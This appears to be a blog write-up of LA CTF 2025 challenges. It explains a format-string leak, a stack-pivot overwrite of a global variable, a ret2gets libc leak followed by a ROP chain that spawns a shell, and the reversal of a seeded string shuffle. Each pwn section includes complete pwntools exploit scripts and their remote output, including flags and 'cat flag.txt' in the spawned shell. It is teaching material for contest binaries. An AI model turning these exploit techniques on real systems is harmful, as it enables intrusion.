---
title: "[WRITE UP] - LA CTF 2025"
published: 2025-02-13
description: "Write up for LA CTF 2025"
image: "./image.png"
tags:
  - PWN
  - REV
category: "CTF Write ups"
draft: false
---

# TL;DR

This is a very good CTF competition, and maybe since I first learned pwn until now I have played a good competition like this. In this CTF I have solved 3 pwn challenges and 1 rev challenge. After a busy time with school exams, I decided to start writing write ups for the challenges I solved.

# pwn/2password

## Description

> 2Password > 1Password

## Reverse Engineering

```sh
[*] '/home/alter/CTFs/2025/LACTF2025/2password/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```

From the security checks on the binary, we can make several key observations:

- No Stack Canary: The binary does not use stack canaries, meaning it lacks protection against stack-based buffer overflows. This makes it easier to overwrite return addresses without triggering a security check.

- PIE Enabled: Position Independent Executable (PIE) is enabled, which means that memory addresses are randomized on each execution. This makes absolute address leaks necessary for a reliable exploit.

- NX Enabled: The Non-Executable (NX) bit is enabled, preventing direct execution of shellcode on the stack. An exploit would likely require techniques like ROP (Return-Oriented Programming).

- Partial RELRO: Partial Relocation Read-Only (RELRO) suggests that the GOT (Global Offset Table) is writable, which could be useful for GOT overwrite attacks.

- Not Stripped: Since the binary is not stripped, function symbols are available, making reverse engineering and exploit development easier.

But before we know what to to next we need to analysis the `pseudo-code` gave by IDA:

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char flag[48]; // [rsp+0h] [rbp-D0h] BYREF
  char password2[48]; // [rsp+30h] [rbp-A0h] BYREF
  char password1[48]; // [rsp+60h] [rbp-70h] BYREF
  char username[56]; // [rsp+90h] [rbp-40h] BYREF
  FILE *stdin@GLIBC_2.2.5; // [rsp+C8h] [rbp-8h]

  setbuf(stdout, 0LL);
  printf("Enter username: ");
  readline(username, 42LL, stdin);
  printf("Enter password1: ");
  readline(password1, 42LL, stdin);
  printf("Enter password2: ");
  readline(password2, 42LL, stdin);
  stdin@GLIBC_2.2.5 = fopen("flag.txt", "r");
  if ( !stdin@GLIBC_2.2.5 )
  {
    puts("can't open flag");
    exit(1);
  }
  readline(flag, 42LL, stdin@GLIBC_2.2.5);
  if ( !strcmp(username, "kaiphait") && !strcmp(password1, "correct horse battery staple") && !strcmp(password2, flag) )
  {
    puts("Access granted");
  }
  else
  {
    printf("Incorrect password for user ");
    printf(username);
    putchar(10);
  }
  return 0;
}
```

From the `pseudo-code`, the program follows this sequence:

- Prompts for `username` → stores it in `username[]`

- Prompts for `password1` → stores it in `password1[]`

- Prompts for `password2` → stores it in `password2[]`

- Reads the `flag` from `flag.txt` into `flag[]`

- Compares the inputs with hardcoded values

If the credentials don’t match, the program prints:

```c
  else
  {
    printf("Incorrect password for user ");
    printf(username);
    putchar(10);
  }
```

## Exploit Development

Since `printf()` is used without a format specifier, it treats username as a format string. This means if we input format specifiers (%x, %s, %p, etc.), they will be interpreted instead of being printed as plain text. But in this article we cannot use `%s` to leak data because the variable `flag` is declared and placed right on the stack, and when reading data from `flag.txt` it will be saved here. Format string `%s` can only leak data when it is a specific address. So the alternative way is use `%p` and then unpack it to see the value

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *
import struct

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''


        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def exploit():

    payload = b'%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|'

    sla(b'username: ', payload)
    sl(b'A')
    ru(b'user ')

    output = rl()[:-1].split(b'|')

    for index, value in enumerate(output):

        if value == b"(nil)":
            encoded_value = b"(nil)"
        else:
            try:
                int_value = int(value, 16)
                encoded_value = struct.pack("<Q", int_value)
            except ValueError:
                encoded_value = b"(error)"

        print(f'Index: {index} -> Value: {value} -> Encoded: {encoded_value} ' )

    interactive()

if __name__ == '__main__':
  exploit()
```

## Get flag

```sh
alter ^ Sol in ~/CTFs/2025/LACTF2025/2password
$ ./xpl.py REMOTE chall.lac.tf 31142
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to chall.lac.tf on port 31142: Done
[DEBUG] Received 0x10 bytes:
    b'Enter username: '
[DEBUG] Sent 0x2b bytes:
    b'%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|\n'
[DEBUG] Sent 0x2 bytes:
    b'A\n'
[DEBUG] Received 0x22 bytes:
    b'Enter password1: Enter password2: '
[DEBUG] Received 0xa6 bytes:
    b'Incorrect password for user 0x7fffb4906390|(nil)|(nil)|0x571f409f84a8|(nil)|0x75687b667463616c|0x66635f327265746e|0x7d38367a783063|(nil)|(nil)|(nil)|0x41|(nil)|(nil)\n'
Index: 0 -> Value: b'0x7fffb4906390' -> Encoded: b'\x90c\x90\xb4\xff\x7f\x00\x00'
Index: 1 -> Value: b'(nil)' -> Encoded: b'(nil)'
Index: 2 -> Value: b'(nil)' -> Encoded: b'(nil)'
Index: 3 -> Value: b'0x571f409f84a8' -> Encoded: b'\xa8\x84\x9f@\x1fW\x00\x00'
Index: 4 -> Value: b'(nil)' -> Encoded: b'(nil)'
Index: 5 -> Value: b'0x75687b667463616c' -> Encoded: b'lactf{hu'
Index: 6 -> Value: b'0x66635f327265746e' -> Encoded: b'nter2_cf'
Index: 7 -> Value: b'0x7d38367a783063' -> Encoded: b'c0xz68}\x00'
Index: 8 -> Value: b'(nil)' -> Encoded: b'(nil)'
Index: 9 -> Value: b'(nil)' -> Encoded: b'(nil)'
Index: 10 -> Value: b'(nil)' -> Encoded: b'(nil)'
Index: 11 -> Value: b'0x41' -> Encoded: b'A\x00\x00\x00\x00\x00\x00\x00'
Index: 12 -> Value: b'(nil)' -> Encoded: b'(nil)'
Index: 13 -> Value: b'(nil)' -> Encoded: b'(nil)'
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

# pwn/state-change

## Description

>
> Changes in state are like rustlings in the wind

## Analysis

```sh
[*] '/home/alter/CTFs/2025/LACTF2025/state-change/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

From the security checks on the binary, we can make several key observations:

- No Stack Canary → Vulnerable to stack-based buffer overflows.

- NX Enabled → The stack is non-executable, so shellcode injection won’t work; ROP (Return-Oriented Programming) may be needed.

- No PIE → Binary is loaded at a fixed address (0x400000), making ROP exploitation easier since function addresses are static.

- Full RELRO → The GOT (Global Offset Table) is read-only, preventing GOT overwrite attacks.

In this challenge we are given the source code, let's look at it and analyze what it has.

```c
#include <stdio.h>
#include <string.h>

char buf[0x500]; // Wow so useful
int state;
char errorMsg[0x70];

void win() {
    char filebuf[64];
    strcpy(filebuf, "./flag.txt");
    FILE* flagfile = fopen("flag.txt", "r");

    /* ********** ********** */
    // Note this condition in win()
    if(state != 0xf1eeee2d) {
        puts("\ntoo ded to gib you the flag");
        exit(1);
    }
    /* ********** ********** */

    if (flagfile == NULL) {
        puts(errorMsg);
    } else {
        char buf[256];
        fgets(buf, 256, flagfile);
        buf[strcspn(buf, "\n")] = '\0';
        puts("Here's the flag: ");
        puts(buf);
    }
}

void vuln(){
    char local_buf[0x20];
    puts("Hey there, I'm deaddead. Who are you?");
    fgets(local_buf, 0x30, stdin);
}

int main(){

    state = 0xdeaddead;
    strcpy(errorMsg, "Couldn't read flag file. Either create a test flag.txt locally and try connecting to the server to run instead.");

    setbuf(stdin, 0);
    setbuf(stdout, 0);

    vuln();

    return 0;
}
```

At first glance, this seems to be a `ret2win` challenge because we have the `win` function here, but if we look closely, in the `win` function we need another condition, which is that `state` must be equal to `0xf1eeee2d`, this will make it harder for us to change its data.

But in the `vuln()` function:

```c
void vuln(){
    char local_buf[0x20];
    puts("Hey there, I'm deaddead. Who are you?");
    fgets(local_buf, 0x30, stdin);
}
```

We can see that there's a `Buffer Overflow`, and let check what we can overwrite if we input full 0x30 byte:

```sh
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
 RAX  0x7fffffffdbc0 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaa'
 RBX  0
*RCX  0x7ffff7e987e2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
*RDX  0xfbad208b
*RDI  0x7ffff7fa0a80 (_IO_stdfile_0_lock) ◂— 0
*RSI  0x7ffff7f9eb23 (_IO_2_1_stdin_+131) ◂— 0xfa0a800000000061 /* 'a' */
*R8   0
*R9   0
 R10  0x7ffff7fc3908 ◂— 0xd00120000000e
 R11  0x246
 R12  0x7fffffffdd08 —▸ 0x7fffffffdf9f ◂— '/home/alter/CTFs/2025/LACTF2025/state-change/chall'
 R13  0x4012eb (main) ◂— endbr64
 R14  0x403db0 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011a0 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffdbe0 ◂— 'eaaaaaaafaaaaaa'
 RSP  0x7fffffffdbc0 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaa'
*RIP  0x4012e8 (vuln+51) ◂— nop
───────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────
   0x4012d0 <vuln+27>    mov    rdx, qword ptr [rip + 0x2d59]     RDX, [stdin@GLIBC_2.2.5] => 0x7ffff7f9eaa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
   0x4012d7 <vuln+34>    lea    rax, [rbp - 0x20]                 RAX => 0x7fffffffdbc0 ◂— 2
   0x4012db <vuln+38>    mov    esi, 0x30                         ESI => 0x30
   0x4012e0 <vuln+43>    mov    rdi, rax                          RDI => 0x7fffffffdbc0 ◂— 2
   0x4012e3 <vuln+46>    call   fgets@plt                   <fgets@plt>

 ► 0x4012e8 <vuln+51>    nop
   0x4012e9 <vuln+52>    leave
   0x4012ea <vuln+53>    ret

   0x4012eb <main>       endbr64
   0x4012ef <main+4>     push   rbp
   0x4012f0 <main+5>     mov    rbp, rsp
────────────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────────────
00:0000│ rax rsp 0x7fffffffdbc0 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaa'
01:0008│-018     0x7fffffffdbc8 ◂— 'baaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaa'
02:0010│-010     0x7fffffffdbd0 ◂— 'caaaaaaadaaaaaaaeaaaaaaafaaaaaa'
03:0018│-008     0x7fffffffdbd8 ◂— 'daaaaaaaeaaaaaaafaaaaaa'
04:0020│ rbp     0x7fffffffdbe0 ◂— 'eaaaaaaafaaaaaa'
05:0028│+008     0x7fffffffdbe8 ◂— 0x61616161616166 /* 'faaaaaa' */
06:0030│+010     0x7fffffffdbf0 ◂— 1
07:0038│+018     0x7fffffffdbf8 —▸ 0x7ffff7dadd90 (__libc_start_call_main+128) ◂— mov edi, eax
──────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────────────
 ► 0         0x4012e8 vuln+51
   1 0x61616161616166 None
   2              0x1 None
   3   0x7ffff7dadd90 __libc_start_call_main+128
   4   0x7ffff7dade40 __libc_start_main+128
   5         0x401115 _start+37
```
We can see we have control over both `saved RBP` and ` saved RIP`

## Exploit Development

Our objective is to modify the `state` variable to `0xf1eeee2d`, and we have control over both the `saved RBP` and `saved RIP`. Before diving into the exploit, let’s analyze how `fgets()` operates in this context.

```sh
   0x4012d0 <vuln+27>    mov    rdx, qword ptr [rip + 0x2d59]     RDX, [stdin@GLIBC_2.2.5] => 0x7ffff7f9eaa0 (_IO_2_1_stdin_) ◂— 0xfbad208b
   0x4012d7 <vuln+34>    lea    rax, [rbp - 0x20]                 RAX => 0x7fffffffdbc0 ◂— 2
   0x4012db <vuln+38>    mov    esi, 0x30                         ESI => 0x30
   0x4012e0 <vuln+43>    mov    rdi, rax                          RDI => 0x7fffffffdbc0 ◂— 2
   0x4012e3 <vuln+46>    call   fgets@plt                   <fgets@plt>
```

Here, `lea rax, [rbp - 0x20]` loads the buffer’s address into `RAX`, which is then passed as `RDI` to `fgets()`. With control over `saved RBP` and a `buffer overflow`, we can manipulate where the program writes our input.

```sh
pwndbg> x/10xg 0x404540
0x404540 <state>:       0x00000000deaddead      0x0000000000000000
0x404550:       0x0000000000000000      0x0000000000000000
0x404560 <errorMsg>:    0x74276e646c756f43      0x6c66206461657220
0x404570 <errorMsg+16>: 0x2e656c6966206761      0x2072656874694520
0x404580 <errorMsg+32>: 0x6120657461657263      0x6c66207473657420
pwndbg> x/10xg (0x404540-0x10)
0x404530 <buf+1264>:    0x0000000000000000      0x0000000000000000
0x404540 <state>:       0x00000000deaddead      0x0000000000000000
0x404550:       0x0000000000000000      0x0000000000000000
0x404560 <errorMsg>:    0x74276e646c756f43      0x6c66206461657220
0x404570 <errorMsg+16>: 0x2e656c6966206761      0x2072656874694520
```

Since state is at `0x404540`, we need to overwrite it with `0xf1eeee2d`. However, to ensure proper alignment and avoid corruption, we write data slightly before `state`, adjusting our input to target the exact memory region effectively. Hence, we subtract `0x10` from its address to control the write precisely.


```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b *vuln+53
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def exploit():

    offset = 32
    bss = 0x404530 # state - 0x10

    payload1 = flat({
        offset: [
            bss + 0x20,
            exe.sym["vuln"]+8
        ]
    })

    state = 0xf1eeee2d # Our value need to change
    payload2 = b"A" * 0xf + p64(state) + b"B" * 0x10 + p64(exe.sym["win"])

    sa(b"?", payload1)
    sa(b"?", payload2)

    interactive()

if __name__ == '__main__':
  exploit()
```

## Get flag

```sh
alter ^ Sol in ~/CTFs/2025/LACTF2025/state-change
$ ./xpl.py REMOTE chall.lac.tf 31593
[*] '/usr/lib/x86_64-linux-gnu/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
[+] Opening connection to chall.lac.tf on port 31593: Done
[DEBUG] Received 0x26 bytes:
    b"Hey there, I'm deaddead. Who are you?\n"
[DEBUG] Sent 0x30 bytes:
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  50 45 40 00  00 00 00 00  bd 12 40 00  00 00 00 00  │PE@·│····│··@·│····│
    00000030
[DEBUG] Received 0x26 bytes:
    b"Hey there, I'm deaddead. Who are you?\n"
[DEBUG] Sent 0x2f bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 2d  │AAAA│AAAA│AAAA│AAA-│
    00000010  ee ee f1 00  00 00 00 42  42 42 42 42  42 42 42 42  │····│···B│BBBB│BBBB│
    00000020  42 42 42 42  42 42 42 d6  11 40 00 00  00 00 00     │BBBB│BBB·│·@··│···│
    0000002f
[*] Switching to interactive mode

[DEBUG] Received 0x36 bytes:
    b"Here's the flag: \n"
    b'lactf{1s_tHi5_y0Ur_1St_3vER_p1VooT}\n'
Here's the flag:
lactf{1s_tHi5_y0Ur_1St_3vER_p1VooT}
```

# pwn/minceraft

## Description

>
> look mom i made minecraft!

## Analysis

```sh
[*] '/home/alter/CTFs/2025/LACTF2025/minecraft/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

From the security checks on the binary, we can make several key observations:

- RELRO: Partial RELRO → GOT is writable, making GOT overwrite attacks possible.

- Stack Canary: No canary → Stack-based buffer overflows are easier to exploit.

- NX (No-Execute): Enabled → We cannot execute shellcode on the stack.

- PIE (Position-Independent Executable): Disabled (0x400000) → The binary has a fixed base address, making ROP (Return-Oriented Programming) easier.

As in the previous challenge, this challenge also comes with source code.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int read_int() {
  int x;
  if (scanf(" %d", &x) != 1) {
    puts("wtf");
    exit(1);
  }
  return x;
}

int main(void) {
  setbuf(stdout, NULL);
  while (1) {
    puts("\nM I N C E R A F T\n");
    puts("1. Singleplayer");
    puts("2. Multiplayer");
    if (read_int() != 1) {
      puts("who needs friends???");
      exit(1);
    }
    puts("Creating new world");
    puts("Enter world name:");
    char world_name[64];
    scanf(" ");
    gets(world_name);
    puts("Select game mode");
    puts("1. Survival");
    puts("2. Creative");
    if (read_int() != 1) {
      puts("only noobs play creative smh");
      exit(1);
    }
    puts("Creating new world");
    sleep(1);
    puts("25%");
    sleep(1);
    puts("50%");
    sleep(1);
    puts("75%");
    sleep(1);
    puts("100%");
    puts("\nYOU DIED\n");
    puts("you got blown up by a creeper :(");
    puts("1. Return to main menu");
    puts("2. Exit");
    if (read_int() != 1) {
      return 0;
    }
  }
}
```

So the flow of the program is:

- Main Menu: Requires selecting `1. Singleplayer`, otherwise exits.
- World Creation: Prompts for a name (`gets(world_name)`, `buffer overflow` risk).
- Game Mode Selection: Must choose `1. Survival`, or the program exits.
- Loading Sequence: Displays progress, then `YOU DIED`.
- Game Over Options: 1. Restart or 2. Exit.

Since the libc version given in this challenge is a pretty high libc version, this proves that the common gadgets used to leak data are no longer available. Normally, in this article, we would use `Stack Pivot` to leak data, but because this method is quite confusing, so I found another way. When we look closely, we will see that the program uses the `gets()` function to get our input data.

The `gets` function only requires a single argument, and this can help us control `RDI`. And I wrote a simple program to understand how `gets()` works:

```c
# include <stdio.h>

// gcc demo.c -o demo -no-pie -fno-stack-protector

int main(){

	char buf[0x20];
	puts("Just test!!");
	gets(buf);

	return 0;

}
```

When I use `gdb` to debug and check the arguments before calling the `gets` function

```sh
pwndbg> b*main+39
Breakpoint 1 at 0x40117d
pwndbg> r
Starting program: /home/alter/CTFs/2025/LACTF2025/minecraft/demo
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Just test!!

Breakpoint 1, 0x000000000040117d in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
 RAX  0
 RBX  0
 RCX  0x7ffff7e98887 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  1
 RDI  0x7fffffffdbf0 —▸ 0x7fffffffdfa9 ◂— 0x34365f363878 /* 'x86_64' */
 RSI  1
 R8   0
 R9   0x4052a0 ◂— 'Just test!!\n'
 R10  0x77
 R11  0x246
 R12  0x7fffffffdd28 —▸ 0x7fffffffdfb1 ◂— '/home/alter/CTFs/2025/LACTF2025/minecraft/demo'
 R13  0x401156 (main) ◂— endbr64
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401120 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffdc10 ◂— 1
 RSP  0x7fffffffdbf0 —▸ 0x7fffffffdfa9 ◂— 0x34365f363878 /* 'x86_64' */
 RIP  0x40117d (main+39) ◂— call gets@plt
───────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────
 ► 0x40117d <main+39>    call   gets@plt                    <gets@plt>
        rdi: 0x7fffffffdbf0 —▸ 0x7fffffffdfa9 ◂— 0x34365f363878 /* 'x86_64' */
        rsi: 1
        rdx: 1
        rcx: 0x7ffff7e98887 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
```

And after calling `gets`:

```sh
pwndbg> ni
alter
0x0000000000401182 in main ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
──────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────
*RAX  0x7fffffffdbf0 ◂— 0x7265746c61 /* 'alter' */
 RBX  0
*RCX  0x7ffff7f9eaa0 (_IO_2_1_stdin_) ◂— 0xfbad2288
 RDX  1
*RDI  0x7ffff7fa0a80 (_IO_stdfile_0_lock) ◂— 0
 RSI  1
 R8   0
*R9   0
 R10  0x77
 R11  0x246
 R12  0x7fffffffdd28 —▸ 0x7fffffffdfb1 ◂— '/home/alter/CTFs/2025/LACTF2025/minecraft/demo'
 R13  0x401156 (main) ◂— endbr64
 R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401120 (__do_global_dtors_aux) ◂— endbr64
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x7fffffffdc10 ◂— 1
 RSP  0x7fffffffdbf0 ◂— 0x7265746c61 /* 'alter' */
*RIP  0x401182 (main+44) ◂— mov eax, 0
pwndbg> vmmap $rdi
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x7ffff7f9e000     0x7ffff7fa0000 rw-p     2000 219000 /usr/lib/x86_64-linux-gnu/libc.so.6
►   0x7ffff7fa0000     0x7ffff7fad000 rw-p     d000      0 [anon_7ffff7fa0] +0xa80
    0x7ffff7fbb000     0x7ffff7fbd000 rw-p     2000      0 [anon_7ffff7fbb]
```

Gotcha! we notice that when we call the `fgets` function, the value of `RDI` will then be a writable area right below our libc and that is `_IO_stdfile_0_lock`. And we will use the `ret2gets` technique here to leak the necessary data. Since this is just a write up, I will not go into the depth of this `gets` function (I will write an article about this technique later). But for now you can read [here](https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/ret2gets) to get a rough idea of ​​it.

## Exploit Development

With the ideas we have analyzed above, we can easily leak libc and from there get shell.

```py
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = exe.libc

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript='''

        b*main+170
        b*main+460
        c
        '''.format(**locals()), *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

p = start()

# ==================== EXPLOIT ====================

def choice(option):

    sl(str(f'{option}'))

def stage1():

    pop_rbp = 0x40115d # pop rbp; ret;
    ret = 0x401016

    payload = flat({
        offset: [
            exe.plt["gets"],
            exe.plt["gets"],
            exe.plt["puts"],
            exe.sym["main"]
        ]
    })

    choice(1)
    sla(b'name:\n', payload)
    choice(1)
    choice(2)

    sl(b"A" * 4 + b"\x00"*3)

    ru(b"AAAA\xff\xff\xff\xff")
    leak = u64(rl()[:-1].ljust(0x8, b'\0'))
    libc.address = leak + 0x28c0

    slog('Leak', leak)
    slog('Libc base', libc.address)

def stage2():

    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

    payload = flat({

        offset: [
            pop_rdi,
            next(libc.search(b'/bin/sh\0')),
            pop_rdi + 1,
            libc.sym.system
        ]

    })

    choice(1)
    sla(b'name:\n', payload)
    choice(1)
    choice(2)

def exploit():

    global offset

    offset = 72

    stage1()
    stage2()

    interactive()

if __name__ == '__main__':
  exploit()
```

## Get flag

```sh
alter ^ Sol in ~/CTFs/2025/LACTF2025/minecraft
$ ./xpl.py REMOTE chall.lac.tf 31137
[*] '/home/alter/CTFs/2025/LACTF2025/minecraft/libc.so.6'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
[+] Opening connection to chall.lac.tf on port 31137: Done
/home/alter/custom_libs/pwncus/pwncus.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sl = lambda data: __main__.p.sendline(data)
[+] Leak: 0x7a496595e740
[+] Libc base: 0x7a4965961000
[*] Loaded 197 cached gadgets for '/home/alter/CTFs/2025/LACTF2025/minecraft/libc.so.6'
/home/alter/custom_libs/pwncus/pwncus.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  sl = lambda data: __main__.p.sendline(data)
[*] Switching to interactive mode
Select game mode
1. Survival
2. Creative
Creating new world
25%
50%
75%
100%

YOU DIED

you got blown up by a creeper :(
1. Return to main menu
2. Exit
$ ls
flag.txt
run
$ cat flag.txt
lactf{miiineeeee_diaaaaamoooonddsssssss_ky8cnd5e}
```

# rev/the-eye

## Description

> I believe we’ve reached the end of our journey. All that remains is to collapse the innumerable possibilities before us.

## Analysis

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int seed; // eax
  char *s; // [rsp+0h] [rbp-10h]
  int i; // [rsp+Ch] [rbp-4h]

  seed = time(0LL);
  srand(seed);
  s = (char *)read_msg();
  for ( i = 0; i <= 21; ++i )
    shuffle(s);
  puts(s);
  free(s);
  return 0;
}
```

```c
__int64 __fastcall shuffle(const char *s)
{
  __int64 str_len; // rax
  unsigned __int8 temp; // [rsp+13h] [rbp-Dh]
  int rand_value; // [rsp+14h] [rbp-Ch]
  int i; // [rsp+1Ch] [rbp-4h]

  str_len = (unsigned int)strlen(s) - 1;
  for ( i = str_len; i >= 0; --i )
  {
    rand_value = rand() % (i + 1);
    temp = s[i];
    s[i] = s[rand_value];
    str_len = temp;                             // <------- ????
    s[rand_value] = temp;
  }
  return str_len;
}
```

The `shuffle` function implements a [Fisher-Yates shuffle](https://en.wikipedia.org/wiki/Fisher%E2%80%93Yates_shuffle) (also known as the Knuth shuffle) to randomly rearrange the characters of a given string `s`. And the flow of that functions is:

- Get the length of the string `(strlen(s) - 1)`.
- Iterate from the end of the string to the beginning:
- Generate a random index within the current range `(rand() % (i + 1))`.
- Swap the character at the current index with the character at the random index.

This way the strings will be suffled up and then printed out using the `puts` function. Since its values ​​are random after each loop run, to get the most accurate flag we need to brute force it until we find the string containing the flag in it.

## Script

And I simply wrote an unshuffled program with the same logic as the program did <(")

P/s: We have to iterate backwards through the strings because the shuffle is a series of sequential swaps, and to undo it we have to reverse each step.

```py
from ctypes import CDLL
from ctypes.util import find_library

libc = CDLL(find_library("c"))

def unshuffle(message, seed):
    # Convert string to list once
    chars = list(message)
    libc.srand(seed)

    # Pre-calculate all random numbers
    n = len(chars)
    rands = []
    print(f"\nRandom numbers for seed {seed}:")
    for round_num in range(22):
        temp = []
        print(f"\nRound {round_num + 1}:")
        for i in range(n - 1, -1, -1):
            rand_val = libc.rand() % (i + 1)
            temp.append(rand_val)
            print(f"{rand_val}", end=" ")
        rands.append(temp)
    print("\n")

    # Apply unshuffling
    for rand_seq in rands[::-1]:
        for i, rand_val in enumerate(rand_seq[::-1]):
            chars[i], chars[rand_val] = chars[rand_val], chars[i]

    return ''.join(chars)

def find_flag():
    message = "soolliWssiptre. e2se.h eparthngnutrer uosmegm_yah  elf,non rerltnhi;eneddah cv idonfiur u eo.l  e mnaf ee rtgar heeomamccl hoehcor. ihew_h oacyomeht_leysnh ryheeEamsciabcnex ce tOa  gyeu suteosnt h- tosssa tnaede d  ipxhsmpoep,m rneiadiWdnetcdpn iisefiro es e}eer o ear,nyrhee at laestt o ts seesoatfhsan  sopeeoe EdsetepdydrlaaHtaa alocligetl gldeaer tAvc ?i sntaat  decessea  dtnent tihci fhsrso ser aehaeedssoguuTpct edlnslraielu rntp dhdra mt s aeltl  e_ner aa,n,eude pant -nnsnv in gwptiiyeetda ahespt ,cyxestssrnutthioceuit,{t itna a tw lemggetnnHsyfshss_ssv l  thpaui  eoc2eg tetlggnaasym  vn   ia _etivaotnsetd rtpirr   ly ytoaeedihreltee iswetntorginN  si  atgenar se  dbi tflrnoncaadimlm nanuhho  rxaeoo_ meae pihttxie"
    seed = libc.time(0)

    while True:
        result = unshuffle(message, seed)
        if "lactf" in result.lower():
            return result, seed
        seed -= 1

result, final_seed = find_flag()
print(f"Found with seed: {final_seed}")
print(f"Result: {result}")
```

## Get flag

```sh
$ python3 solve.py

Random numbers for seed 1739419079:
<...>
Round 22:
